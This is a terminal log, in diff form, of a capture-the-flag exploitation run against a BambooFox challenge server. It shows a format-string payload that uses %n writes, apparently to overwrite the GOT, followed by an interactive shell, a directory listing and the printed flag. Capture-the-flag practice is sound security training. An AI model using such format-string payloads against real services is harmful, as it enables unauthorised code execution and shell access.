@@ -1,0 +1,31 @@
+root@kali:~/Desktop/Pwn/WhaleCTF_pwn3# python 300.py
+[+] Opening connection to bamboofox.cs.nctu.edu.tw on port 22003: Done
+\x0c\xa0\x0\xa0\x0\x0e\xa0\x0\x0f\xa0\x0%7$hhn%116c%8$hhn%128c%9$hhn%4c%10$hhn 0x36
+PWN!
+[*] Switching to interactive mode
+\x0c\xa0\x0\xa0\x0\x0e\xa0\x0\x0f\xa0\x0                                                                                                                   @                                                                                                                                   \x00
+$ ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+$ cat /home/ctf/flag
+BAMBOOFOX{GOT_IT_BY_OVERWRITE_GOT_TABLE_OR_NOT}
+$  
